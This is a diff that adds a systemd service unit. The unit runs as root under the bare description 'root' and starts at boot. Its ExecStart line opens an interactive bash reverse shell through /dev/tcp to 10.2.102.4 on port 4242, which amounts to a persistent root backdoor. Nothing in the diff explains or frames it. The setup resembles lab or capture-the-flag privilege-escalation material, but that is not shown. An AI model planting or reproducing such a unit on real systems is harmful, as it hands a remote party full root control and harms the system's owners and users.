@@ -1,0 +1,10 @@
+[Unit]
+Description=root
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.2.102.4/4242 0>&1'
+
+[Install]
+WantedBy=multi-user.target
